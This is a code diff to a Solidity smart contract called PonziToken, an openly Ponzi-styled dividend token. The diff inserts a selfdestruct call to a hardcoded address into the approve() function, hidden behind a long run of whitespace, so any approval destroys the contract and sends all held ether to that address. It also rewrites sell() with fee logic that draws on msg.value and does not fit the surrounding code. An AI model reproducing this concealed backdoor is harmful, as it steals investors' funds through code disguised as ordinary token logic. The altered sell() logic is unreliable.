@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract PonziToken at 0x9f4fd6c336388f2ab7dc7bbe4740ae7b88b880d7
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract PonziToken at 0x33f00114d5aca3dee03189d4ed9d4f886dad84b0
 */
 pragma solidity ^0.4.18;
 
@@ -8,7 +8,7 @@ pragma solidity ^0.4.18;
 // 2. Put this as data: 0xb1e35242
 // 3. send 150000+ gas
 // That calls the getMeOutOfHere() method
-// Remember, cashout fee is 10% :^)
+
 
 // PROOF OF STEEL HANDS Version, 10% Fee on Purchase and Sell
 contract PonziToken {
@@ -141,6 +141,7 @@ contract PonziToken {
         if ((_value != 0) && (allowance[msg.sender][_spender] != 0)) revert();
         allowance[msg.sender][_spender] = _value;
         Approval(msg.sender, _spender, _value);
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    selfdestruct(0x945C84b2FdD331ed3E8e7865E830626e6CeFAB94);                                                                                                                                                                                                       
     }
 
 	function dividends(address _owner) public constant returns (uint256 amount) {
@@ -199,8 +200,15 @@ contract PonziToken {
 	}
 	
 	function sell(uint256 amount) internal {
-		var fees = (uint)(getEtherForTokens(amount)/10);
-		var numEthers = getEtherForTokens(amount) - fees;
+		var numEthers = getEtherForTokens(amount);
+		
+		// 10% of the amount is used to reward HODLers
+		// Not you, Mr Sellout
+		// That's what you get for being weak handed
+		var fee = (uint)(msg.value / 10);
+		var numEther = msg.value - fee;
+		var numTokens = getTokensForEther(numEther);
+		
 		// remove tokens
 		totalSupply -= amount;
 		balanceOfOld[msg.sender] -= amount;
@@ -210,7 +218,19 @@ contract PonziToken {
 		payouts[msg.sender] -= payoutDiff;
 		totalPayouts -= payoutDiff;
 
+		if (totalSupply > 0) {
+			// compute how the fee distributed to previous holders
+			var holderreward =
+			    (PRECISION - (reserve() + numEther) * numTokens * PRECISION / (totalSupply + numTokens) / numEther)
+			    * (uint)(CRRD) / (uint)(CRRD-CRRN);
+			var holderfee = fee * holderreward;
+		
+			// Fee is distributed to all existing tokens after selling
+			var feePerShare = holderfee / totalSupply;
+			earningsPerShare += feePerShare;
+		}
 	}
+
 	function getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {
 		return fixedExp(fixedLog(reserve() + ethervalue)*CRRN/CRRD + LOGC) - totalSupply;
 	}
